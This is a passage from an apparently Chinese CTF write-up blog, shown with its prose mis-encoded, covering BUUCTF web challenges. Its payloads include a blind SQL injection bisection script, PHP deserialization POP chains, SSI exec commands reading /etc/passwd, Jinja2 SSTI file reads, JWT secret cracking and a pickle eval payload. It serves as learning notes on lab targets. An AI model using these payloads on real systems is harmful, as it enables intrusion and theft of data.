&quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))&gt;%d)^1&quot;%(i,j) # æŸ¥è¯¢flag sql = &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; % (i, j) data = {&quot;id&quot;: sql} r = requests.get(url, params=data) # print (r.url) if &quot;Click&quot; in r.text: res = 1 else: res = 0 return resdef exp(): global flag for i in range(1, 10000): print(i, ':') low = 31 high = 127 while low &lt;= high: mid = (low + high) // 2 res = payload(i, mid) if res: low = mid + 1 else: high = mid - 1 f = int((low + high + 1)) // 2 if (f == 127 or f == 31): break # print (f) flag += chr(f) print(flag)exp()print('flag=', flag) å­¦ä¹ ä¸€æ³¢ï¼Œå› ä¸ºäºŒåˆ†æ³•çš„é€Ÿåº¦ä¼šå¿«ä¸€å€ï¼ flagè·‘äº†ä¸‰æ¬¡æ‰æ­£ç¡®ï¼Ÿä¸æ‡‚ä¸ºå•¥ [NPUCTF2020]ReadlezPHPæŠ“åŒ…çœ‹å›æ˜¾ æœ‰æç¤º/time.php?sourceæœ‰æºç  12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp{ public $a; public $b; public function __construct(){ $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; } public function __destruct(){ $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); }}$c = new HelloPhp;if(isset($_GET['source'])){ highlight_file(__FILE__); die(0);}@$ppp = unserialize($_GET[&quot;data&quot;]); æ„é€ ä¸€ä¸ªååºåˆ—åŒ–å‡½æ•°å°±è¡Œäº†ï¼Œ 1 å‘ç°evalæ— æ³•æ‰§è¡Œï¼Ÿå¯èƒ½æ˜¯æœ‰è¿‡æ»¤å§ï¼Œæ‰€ä»¥è¿™é‡Œå¼•å…¥ä¸€ä¸ªassertå‡½æ•°ï¼šassertå‡½æ•° åŠŸèƒ½æ˜¯åˆ¤æ–­ä¸€ä¸ªè¡¨è¾¾å¼æ˜¯å¦æˆç«‹ï¼Œè¿”å›true or falseï¼Œé‡ç‚¹æ˜¯å‡½æ•°ä¼šæ‰§è¡Œæ­¤è¡¨è¾¾å¼ã€‚å¦‚æœè¡¨è¾¾å¼ä¸ºå‡½æ•°å¦‚assert(â€œecho(1)â€)ï¼Œåˆ™ä¼šè¾“å‡º1ï¼Œè€Œå¦‚æœä¸ºassert(â€œecho 1;â€)åˆ™ä¸ä¼šæœ‰è¾“å‡ºã€‚ 123456789101112131415161718192021222324&lt;?php#error_reporting(0);class HelloPhp{ public $a; public $b; public function __construct() { $this-&gt;a = &quot;assert&quot;; $this-&gt;b = &quot;phpinfo()&quot;; } public function __destruct() { $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); }}$c = new HelloPhp;print(serialize($c)); [BJDCTF2020]EasySearchswpæºç æ³„éœ² 123456789101112131415161718192021222324252627282930313233343536&lt;?php ob_start(); function get_hash(){ $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(&quot;Content-Type:text/html;charset=utf-8&quot;); *** if(isset($_POST['username']) and $_POST['username'] != '' ) { $admin = '6d0bc1'; if ( $admin == substr(md5($_POST['password']),0,6)) { echo &quot;&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = ' *** *** &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt; *** ***'; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; } else { echo &quot;&lt;script&gt;alert('[!] Failed')&lt;/script&gt;&quot;; }else { *** } ***?&gt; hashç¢°æ’å°è„šæœ¬ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­: 1234567import hashlibfor num in range(10000,9999999999): res=hashlib.md5(str(num).encode()).hexdigest() if res[0:6]==&quot;6d0bc1&quot;: print(str(num)) break ç„¶åå°±ç›´æ¥ç”¨è´¦å·å¯†ç ç™»å½•ï¼ŒæŠ“åŒ…ç™»å½•ç•Œé¢ï¼Œå°±ä¼šå‘ç°ä¸€ä¸ªæ–‡ä»¶ç½‘é¡µé“¾æ¥:å¯ä»¥çœ‹åˆ°æ—è¾¹æœ‰ä¸ªpublicå•¥çš„ï¼Œç‚¹å…¥å°±å¯ä»¥å‘ç° å½“ç„¶ï¼Œè¿™é‡Œç”¨åˆ°ä¸€ä¸ªæ–°å­¦çš„çŸ¥è¯†ï¼š ssiæ³¨å…¥SSIæ˜¯åµŒå…¥HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œåœ¨é¡µé¢è¢«æä¾›æ—¶ç”±æœåŠ¡å™¨è¿›è¡Œè¿ç®—ï¼Œä»¥å¯¹ç°æœ‰HTMLé¡µé¢å¢åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œè€Œæ— é¡»é€šè¿‡CGIç¨‹åºæä¾›å…¶æ•´ä¸ªé¡µé¢ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–åŠ¨æ€æŠ€æœ¯ã€‚ ä»æŠ€æœ¯è§’åº¦ä¸Šæ¥è¯´ï¼ŒSSIå°±æ˜¯åœ¨HTMLæ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šè¡Œè°ƒç”¨çš„å‘½ä»¤æˆ–æŒ‡é’ˆï¼Œå³å…è®¸é€šè¿‡åœ¨HTMLé¡µé¢æ³¨å…¥è„šæœ¬æˆ–è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚ 1.2 SSIè¯­æ³• é¦–å…ˆï¼Œä»‹ç»ä¸‹SHTMLï¼Œåœ¨SHTMLæ–‡ä»¶ä¸­ä½¿ç”¨SSIæŒ‡ä»¤å¼•ç”¨å…¶ä»–çš„htmlæ–‡ä»¶ï¼ˆ#includeï¼‰ï¼Œæ­¤æ—¶æœåŠ¡å™¨ä¼šå°†SHTMLä¸­åŒ…å«çš„SSIæŒ‡ä»¤è§£é‡Šï¼Œå†ä¼ é€ç»™å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶çš„HTMLä¸­å°±ä¸å†æœ‰SSIæŒ‡ä»¤äº†ã€‚æ¯”å¦‚è¯´æ¡†æ¶æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯é‡Œé¢çš„æ–‡ç« ï¼Œå…¶ä»–èœå•ç­‰å³å¯ä»¥ç”¨#includeå¼•ç”¨è¿›æ¥ã€‚ â‘ æ˜¾ç¤ºæœåŠ¡å™¨ç«¯ç¯å¢ƒå˜é‡&lt;#echo&gt; æœ¬æ–‡æ¡£åç§°ï¼š 123456789&lt;!â€“#echo var=&quot;DOCUMENT_NAME&quot;â€“&gt;ç°åœ¨æ—¶é—´ï¼š&lt;!â€“#echo var=&quot;DATE_LOCAL&quot;â€“&gt;æ˜¾ç¤ºIPåœ°å€ï¼š&lt;! #echo var=&quot;REMOTE_ADDR&quot;â€“&gt; â‘¡**å°†æ–‡æœ¬å†…å®¹ç›´æ¥æ’å…¥åˆ°æ–‡æ¡£ä¸­&lt;#include&gt;** 1234567&lt;! #include file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;&lt;!--#include virtual=&quot;index.html&quot; --&gt;&lt;! #include virtual=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt; æ³¨ï¼šfileåŒ…å«æ–‡ä»¶å¯ä»¥åœ¨åŒä¸€çº§ç›®å½•æˆ–å…¶å­ç›®å½•ä¸­ï¼Œä½†ä¸èƒ½åœ¨ä¸Šä¸€çº§ç›®å½•ä¸­ï¼ŒvirtualåŒ…å«æ–‡ä»¶å¯ä»¥æ˜¯Webç«™ç‚¹ä¸Šçš„è™šæ‹Ÿç›®å½•çš„å®Œæ•´è·¯å¾„ â‘¢æ˜¾ç¤ºWEBæ–‡æ¡£ç›¸å…³ä¿¡æ¯&lt;#flastmod&gt;&lt;#fsize&gt;(å¦‚æ–‡ä»¶åˆ¶ä½œæ—¥æœŸ/å¤§å°ç­‰) 1234567æ–‡ä»¶æœ€è¿‘æ›´æ–°æ—¥æœŸï¼š&lt;! #flastmod file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;æ–‡ä»¶çš„é•¿åº¦ï¼š&lt;!â€“#fsize file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt; â‘£ç›´æ¥æ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„å„ç§ç¨‹åº&lt;#exec&gt;(å¦‚CGIæˆ–å…¶ä»–å¯æ‰§è¡Œç¨‹åº) 1234567&lt;!â€“#exec cmd=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!â€“#exec cgi=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;â€“&gt; å°†æŸä¸€å¤–éƒ¨ç¨‹åºçš„è¾“å‡ºæ’å…¥åˆ°é¡µé¢ä¸­ã€‚å¯æ’å…¥CGIç¨‹åºæˆ–è€…æ˜¯å¸¸è§„åº”ç”¨ç¨‹åºçš„è¾“å…¥ï¼Œè¿™å–å†³äºä½¿ç”¨çš„å‚æ•°æ˜¯cmdè¿˜æ˜¯cgiã€‚ â‘¤è®¾ç½®SSIä¿¡æ¯æ˜¾ç¤ºæ ¼å¼&lt;#config&gt;(å¦‚æ–‡ä»¶åˆ¶ä½œæ—¥æœŸ/å¤§å°æ˜¾ç¤ºæ–¹å¼) â‘¥é«˜çº§SSIå¯è®¾ç½®å˜é‡ä½¿ç”¨ifæ¡ä»¶è¯­å¥ã€‚ SSIæŒ–æ˜æ€è·¯ä¸¤ä¸ªæ€è·¯ï¼š 1.ä»ä¸šåŠ¡åœºæ™¯æ¥Fuzzï¼Œæ¯”å¦‚è·å–IPã€å®šä½ã€æ—¶é—´ç­‰2.è¯†åˆ«é¡µé¢æ˜¯å¦åŒ…å«.stm,.shtmå’Œ.shtmlåç¼€è¿™é‡Œæ˜¯shtmlåç¼€æ–‡ä»¶åï¼Œæ•…æ€è€ƒæ˜¯å¦å­˜åœ¨ssiæ³¨å…¥ï¼Œå‘ç°ç”¨æˆ·åå¯æ§ä¼šè¢«å†™å…¥ 123&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;&lt;!--#exec cmd=&quot;cat /&quot;--&gt;username=&lt;!--#exec cmd=&quot;ls ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666 [MRCTF2020]Ezpop1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ $this-&gt;append($this-&gt;var); }}class Show{ public $source; public $str; public function __construct($file='index.php'){ $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.&quot;&lt;br&gt;&quot;; } public function __toString(){ return $this-&gt;str-&gt;source; } public function __wakeup(){ if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $p; public function __construct(){ $this-&gt;p = array(); } public function __get($key){ $function = $this-&gt;p; return $function(); }}if(isset($_GET['pop'])){ @unserialize($_GET['pop']);}else{ $a=new Show; highlight_file(__FILE__);} popé“¾æ„é€ é¢˜ï¼šæœ‰ç‚¹æ— è¯­ï¼Œæˆ‘åœ¨æœ¬åœ°çš„æ—¶å€™å¯ä»¥æˆåŠŸæ‹¿åˆ°flagä½†æ˜¯åœ¨ç½‘é¡µå°±ä¸è¡Œäº†ï¼Ÿï¼Ÿ 123456789101112131415161718&lt;?phpclass Modifier{ public $var= &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}class show{ public $source; public $str;}class Test{ public $p;}$a=new Modifier();$b=new show();$c=new Test();$c-&gt;p=$a;$b-&gt;str=$c;$b-&gt;source=$b;print(urlencode(serialize($b)); æƒ³äº†ä¸€ä¸‹ å¥½åƒæ˜¯å› ä¸ºæˆ‘çš„ç‰ˆæœ¬å­˜åœ¨é‚£ä¸ªæ¼æ´:**åœ¨php7.1+å¯¹ç±»å±æ€§çš„æ£€æµ‹ä¸ä¸¥æ ¼ï¼Œæ‰€ä»¥å¯ä»¥ç”¨publicæ¥ç»•è¿‡ **æ‰€ä»¥æˆ‘ç”¨äº†publicçš„æ—¶å€™æ‰å¯ä»¥æˆåŠŸï¼Œç„¶åè¿™é‡Œæ–°å­¦äº†ä¸€ç§å§¿åŠ¿ï¼šå¦‚æœæ˜¯protectç±»å‹çš„è¯ï¼Œå…¶å®å¯ä»¥åœ¨æœ€ååŠ ä¸€ä¸ªurlencodeæ¥è¿›è¡Œç¼–ç ï¼Œè¿™æ ·è¾“å…¥è¿›å»çš„ç©ºç™½å­—ç¬¦å°±ä¼šè¢«urlè½¬ç ï¼Œåœ¨urlä¸­è¾“å…¥çš„æ—¶å€™ä¹Ÿä¸ä¼šè¢«åƒæ‰:payload: 12O%3A4%3A%22show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D","link":"/2021/04/17/buuctf11/"},{"title":"buuctf12","text":"[NCTF2019]True XML cookbookä¾æ—§æ˜¯xxeæ³¨å…¥ï¼šä½†æ˜¯è¿™é¢˜flagä¸åœ¨æ ¹ç›®å½•ä¸‹æ²¡æ³•ç›´æ¥è¯»å–ï¼Œæ‰€ä»¥çœ‹äº†ä¸€ä¸‹wpè¯´æ˜¯åœ¨å†…ç½‘ä¸»æœºä¸­ï¼ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿæœç„¶è¿˜æ˜¯åšå¾—é¢˜ç›®å°‘äº†ï¼Œå†…ç½‘ä¸»æœºæ–‡ä»¶å¤¹ï¼šè¯»å– /etc/network/interfaces æˆ–è€… /proc/net/arp æˆ–è€… /etc/host ç„¶åå‘ç°ï¼Œæ¥ä¸‹æ¥ä¸€ä¸ªä¸€ä¸ªå°è¯•å°±å¯ä»¥æ‹¿åˆ°flagäº† é™„ä¸Šä¸€ç¯‡xxeæ³¨å…¥çš„å­¦ä¹ æ–‡ç« ï¼šhttps://xz.aliyun.com/t/3357#toc-11 [GYCTF2020]FlaskAppåˆæ˜¯flaskæ¡†æ¶ æ³¨å…¥ ï¼Œç¡®å®šæ˜¯jingjiaæ¨¡æ¿æ³¨å…¥ï¼š æŠ¥é”™çˆ†å‡ºäº†ç½‘ç«™çš„æºç æ–‡ä»¶app.pyï¼Œé‚£å°±å…ˆæ¥ä¸€æ³¢ä»»æ„æ–‡ä»¶è¯»å–çœ‹è¡Œä¸è¡Œ 1{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py', 'r').read() }}{% endif %}{% endfor %} 1from flask import Flask,render_template_string from flask import render_template,request,flash,redirect,url_for from flask_wtf import FlaskForm from wtforms import StringField, SubmitField from wtforms.validators import DataRequired from flask_bootstrap import Bootstrap import base64 app = Flask(__name__) app.config['SECRET_KEY'] = 's_e_c_r_e_t_k_e_y' bootstrap = Bootstrap(app) class NameForm(FlaskForm): text = StringField('BASE64åŠ å¯†',validators= [DataRequired()]) submit = SubmitField('æäº¤') class NameForm1(FlaskForm): text = StringField('BASE64è§£å¯†',validators= [DataRequired()]) submit = SubmitField('æäº¤') def waf(str): black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] for x in black_list : if x in str.lower() : return 1 @app.route('/hint',methods=['GET']) def hint(): txt = &quot;å¤±è´¥ä¹ƒæˆåŠŸä¹‹æ¯ï¼ï¼&quot; return render_template(&quot;hint.html&quot;,txt = txt) @app.route('/',methods=['POST','GET']) def encode(): if request.values.get('text') : text = request.values.get(&quot;text&quot;) text_decode = base64.b64encode(text.encode()) tmp = &quot;ç»“æœ :{0}&quot;.format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) return redirect(url_for('encode')) else : text = &quot;&quot; form = NameForm(text) return render_template(&quot;index.html&quot;,form = form ,method = &quot;åŠ å¯†&quot; ,img = &quot;flask.png&quot;) @app.route('/decode',methods=['POST','GET']) def decode(): if request.values.get('text') : text = request.values.get(&quot;text&quot;) text_decode = base64.b64decode(text.encode()) tmp = &quot;ç»“æœ ï¼š {0}&quot;.format(text_decode.decode()) if waf(tmp) : flash(&quot;no no no !!&quot;) return redirect(url_for('decode')) res = render_template_string(tmp) flash( res ) return redirect(url_for('decode')) else : text = &quot;&quot; form = NameForm1(text) return render_template(&quot;index.html&quot;,form = form, method = &quot;è§£å¯†&quot; , img = &quot;flask1.png&quot;) @app.route('/&lt;name&gt;',methods=['GET']) def not_found(name): return render_template(&quot;404.html&quot;,name = name) if __name__ == '__main__': app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True) çŸ¥é“è¿‡æ»¤äº†å“ªäº›å­—ç¬¦äº† æ¥ä¸‹æ¥ç»§ç»­è¯»å–â€˜ 1{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}//è¿™é‡Œä¹Ÿå°±ä¸ä¸€å®šæ˜¯éœ€è¦catch_warningsäº† ä¹Ÿå¯ä»¥æ˜¯ä¸‹é¢çš„é‚£ä¸ªimportå¾ˆå¤šå¾ˆå¤š 1{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt').read()}}{% endif %}{% endfor %} å°è¯•ä½¿ç”¨ 1{{}} æ„é€ è¯­å¥ï¼š 1{{&quot;&quot;.__class__.__mro__[-1].__subclasses__()[75].__init__.__globals__['__builtins__'].}}//åœ¨75æ‰¾åˆ°_frozen_importlib._ModuleLockå¯ä»¥æŒ‡å‘builtinsï¼Œè€Œbuiltinsé‡Œé¢æœ‰importå¯ä»¥ä½¿ç”¨ï¼Œå¹¶ä¸”ä¹Ÿæœ‰fileé‚£äº›ä¸œè¥¿ï¼Œè¿™ä¸ª75æ˜¯ä¸€ä¸ªä¸€ä¸ªå°è¯•å‡ºæ¥çš„ ä½œç½¢ï¼Œåªèƒ½ä¸€ä¸ªä¸ªå°è¯•äº† æ¥ä¸‹æ¥ç»§ç»­æ„é€ è¯­å¥ 1{{&quot;&quot;.__class__.__mro__[-1].__subclasses__()[75].__init__.__globals__['__builtins__'].open('app.py', 'r').read()}} rç„¶ååé¢çš„è¯­å¥å°±å’Œä¹‹å‰çš„æ²¡å•¥åŒºåˆ«äº†ï¼Œè¿™é¢˜è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ€»è§‰å¾—è‡ªå·±sstiæ³¨å…¥å­¦çš„ä¸å¤Ÿæ·±å…¥ï¼Œå¾ˆå¥‡æ€ªï¼Œå¤§æ¦‚æ˜¯pythonè¿˜æ²¡çœŸæ­£å­¦å¥½å§ è¿™è¾¹æœ‰ä¸ªç‚¹ï¼šå¦‚æœåªæ˜¯subclasses()çš„æ—¶å€™æ˜¯å‡ºä¸äº†ç±»çš„ï¼Œä½†æ˜¯builtinsçš„æ—¶å€™æ˜¯å¯ä»¥å‡ºä»–åä¸‹çš„å‡½æ•°ï¼Œé¡ºå¸¦å‡ºsubclasses()çš„class å°ç»“1.åœ¨pythonâ€”sstiæ³¨å…¥ä¸€æ–‡ä¸­æ·»åŠ äº†å„ä¸ªclasså¯ä»¥ä½¿ç”¨çš„å‡½æ•°æˆ–è€…æ–¹æ³•ï¼Œä»¥åå°±ä¸ä¼šæ‰¾çš„å¾ˆè¿·èŒ«äº†2.ä¸€èˆ¬æƒ…å†µä¸‹éƒ½æ˜¯subclassesçˆ†å‡ºæ‰€æœ‰ç±»ï¼Œç„¶åä¸€ä¸ªä¸ªå»å°è¯•æ•°å­—é è¿‘ä½¿ç”¨ï¼Œè¿™é¢˜ä¸»è¦é ç›²çŒœäº†ï¼Œä¸ç„¶å°±æ˜¯ç”¨ä¸€ä¸ªforå¾ªç¯è¿›è¡Œéå†ï¼Œæˆ‘è§‰å¾—è¿™é¢˜è€ƒå¯Ÿçš„æœ¬æ„ä¹Ÿæ˜¯å¦‚æ­¤æƒ³è¦è®©æˆ‘ä»¬ä½¿ç”¨forå¾ªç¯è¿›è¡Œéå†å§ã€‚3.å¯¹äºsstiæ³¨å…¥ åªèƒ½è¯´ç»§ç»­å­¦ä¹ å§ï¼ [CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikunikunä»¬å†²é¸­,ä¸€å®šè¦ä¹°åˆ°lv6!!! å¯èƒ½æ˜¯è¦ä¹°iv6ï¼Ÿä½†æ˜¯ä¸çŸ¥é“å’‹ä¹°è„šæœ¬å¦‚ä¸‹: 1234567891011121314import requestsr=requests.session()url=&quot;http://23d9591f-d9fe-4282-a6e2-c7aab436b5bb.node3.buuoj.cn/shop?page=&quot;def searchlv6(): for i in range(1000): a=requests.get(url+str(i)) print(url+str(i)) if &quot;lv6.png&quot; in a.text: breakif __name__==&quot;__main__&quot;: searchlv6() è¿™é‡Œè§£é‡Šä¸‹ï¼šé¢˜ç›®è¯´è¦ä¹°åˆ°lv6ï¼Œå½“æˆ‘å†æ‰¾çš„æ—¶å€™é¡µç ä¼šä¸€ç›´å¾€ä¸‹ç¿»ï¼Œ è¿™äº›å›¾ç‰‡ä½ç½®å‡ºç°äº†lv2 5 ä½†æ˜¯å°±æ˜¯æ²¡æœ‰lv6 äºæ˜¯çŒœæƒ³ å¯èƒ½æŸä¸€é¡µå½“ä¸­æœ‰lv6 pythonå†™ä¸ªè„šæœ¬ è·‘ä¸€ä¸‹ å‘ç°åœ¨181é¡µçš„ä½ç½®å‡ºç°äº†: æ¥ä¸‹æ¥è´­ä¹°çœ‹çœ‹ æ³¨å†Œè´¦å·ï¼Œç™»å½•è´­ä¹°ï¼Œå‘ç°ä¸å¤Ÿé’±ï¼ŒæŠ“åŒ…çœ‹çœ‹ï¼Œå‘ç°å¯ä»¥æ”¹æŠ˜æ‰£ï¼šè¿›å…¥é¡µé¢ è¯´éœ€è¦adminï¼ŒæŠ“åŒ…çœ‹çœ‹ï¼šè¿™é‡Œæœ‰ä¸ªjewå¾ˆå¯ç–‘ï¼ŒæŸ¥ä¸€ä¸‹ï¼š jwtä¼ªé€ é¦–å…ˆäº†è§£ä¸‹JWTï¼š JSON Web Tokenï¼ˆJWTï¼‰æ˜¯ä¸€ä¸ªéå¸¸è½»å·§çš„è§„èŒƒã€‚è¿™ä¸ªè§„èŒƒå…è®¸æˆ‘ä»¬ä½¿ç”¨JWTåœ¨ç”¨æˆ·å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ é€’å®‰å…¨å¯é çš„ä¿¡æ¯ã€‚JWTå¸¸è¢«ç”¨äºå‰åç«¯åˆ†ç¦»ï¼Œå¯ä»¥å’ŒRestful APIé…åˆä½¿ç”¨ï¼Œå¸¸ç”¨äºæ„å»ºèº«ä»½è®¤è¯æœºåˆ¶ã€‚ JWTçš„æ•°æ®æ ¼å¼åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š headers , payloadsï¼Œsignature(ç­¾å)ï¼Œå®ƒä»¬ä½¿ç”¨.ç‚¹å·åˆ†å‰² éªŒè¯æ–¹æ³•ï¼šé¦–å…ˆæœåŠ¡ç«¯ä¼šäº§ç”Ÿä¸€ä¸ªkeyï¼Œç„¶åä»¥è¿™ä¸ªkeyä½œä¸ºå¯†é’¥ï¼Œä½¿ç”¨ç¬¬ä¸€éƒ¨åˆ†é€‰æ‹©çš„åŠ å¯†æ–¹å¼ï¼ˆè¿™é‡Œå°±æ˜¯HS256ï¼‰ï¼Œå¯¹ç¬¬ä¸€éƒ¨åˆ†å’Œç¬¬äºŒéƒ¨åˆ†æ‹¼æ¥çš„ç»“æœè¿›è¡ŒåŠ å¯†ï¼Œç„¶åæŠŠåŠ å¯†ç»“æœæ”¾åˆ°ç¬¬ä¸‰éƒ¨åˆ†ã€‚ 1æœåŠ¡å™¨æ¯æ¬¡æ”¶åˆ°ä¿¡æ¯éƒ½ä¼šå¯¹å®ƒçš„å‰ä¸¤éƒ¨åˆ†è¿›è¡ŒåŠ å¯†ï¼Œç„¶åæ¯”å¯¹åŠ å¯†åçš„ç»“æœæ˜¯å¦è·Ÿå®¢æˆ·ç«¯ä¼ é€è¿‡æ¥çš„ç¬¬ä¸‰éƒ¨åˆ†ç›¸åŒï¼Œå¦‚æœç›¸åŒåˆ™éªŒè¯é€šè¿‡ï¼Œå¦åˆ™å¤±è´¥ã€‚ å› ä¸ºåŠ å¯†ç®—æ³•æˆ‘ä»¬å·²ç»çŸ¥é“äº†ï¼Œå¦‚æœæˆ‘ä»¬åªè¦å†å¾—åˆ°åŠ å¯†çš„keyï¼Œæˆ‘ä»¬å°±èƒ½ä¼ªé€ æ•°æ®ï¼Œå¹¶ä¸”é€šè¿‡æœåŠ¡å™¨çš„æ£€æŸ¥ã€‚ æ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬çˆ†ç ´å‡ºæˆ‘ä»¬çš„åŠ å¯†å¯†é’¥ ä½¿ç”¨JWT cracker æœç„¶ç›´æ¥åœ¨windowsä¸‹è½½æ‹–è¿‡å»æ˜¯æœ€å¿«çš„==ï¼Œç„¶ådockerå®‰è£…ä¸€ä¸‹ ç›´æ¥ 1234apt-get install libssl-devdocker build . -t jwtcrackdocker run -it --rm jwtcrackeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo çˆ†ç ´å‡ºæ¥äº† å¯†é’¥æ˜¯1Kun è¿™æ ·å°±å¯ä»¥è¿›å»äº† ç„¶åå®¡è®¡æºç  çœ‹äº†ä¸€ä¸‹ è¿™é¢˜æ˜¯pythonååºåˆ—åŒ–ï¼Œæ²¡é‡è¿‡ï¼Œäºæ˜¯è·Ÿç€wpå­¦ä¹ äº†1.pythonååºåˆ—è¯­å¥: 1p = pickle.loads(urllib.unquote(become)) æ‰€ä»¥becomeæ˜¯æˆ‘ä»¬ä¼ å…¥çš„å‚æ•° æ‰¾åˆ°becomeä¼ å…¥å…¥å£ï¼Œå¼€å§‹æ“ä½œï¼š 12345678910import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (&quot;open('/flag.txt','r').read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print(a) æ²¡é‡è§è¿‡ æ‰€ä»¥ç›´æ¥è·Ÿç€æ‰“äº†ä¸€ä¸‹ï¼Œå‡ ä¸ªåœ°æ–¹ç†è§£ä¸‹ pickleååºåˆ—åŒ– pickleæä¾›äº†ä¸€ä¸ªç®€å•çš„æŒä¹…åŒ–åŠŸèƒ½ã€‚å¯ä»¥å°†å¯¹è±¡ä»¥æ–‡ä»¶çš„å½¢å¼å­˜æ”¾åœ¨ç£ç›˜ä¸Šã€‚ pickleæ¨¡å—åªèƒ½åœ¨pythonä¸­ä½¿ç”¨ï¼Œpythonä¸­å‡ ä¹æ‰€æœ‰çš„æ•°æ®ç±»å‹ï¼ˆåˆ—è¡¨ï¼Œå­—å…¸ï¼Œé›†åˆï¼Œç±»ç­‰ï¼‰éƒ½å¯ä»¥ç”¨pickleæ¥åºåˆ—åŒ–ï¼Œpickleåºåˆ—åŒ–åçš„æ•°æ®ï¼Œå¯è¯»æ€§å·®ï¼Œäººä¸€èˆ¬æ— æ³•è¯†åˆ«ã€‚ p = pickle.loads(urllib.unquote(become)) urllib.unquote:å°†å­˜å…¥çš„å­—å…¸å‚æ•°ç¼–ç ä¸ºURLæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå³è½¬æ¢æˆä»¥key1 = value1 &amp; key2 = value2çš„å½¢å¼pickle.loads(bytes_object): 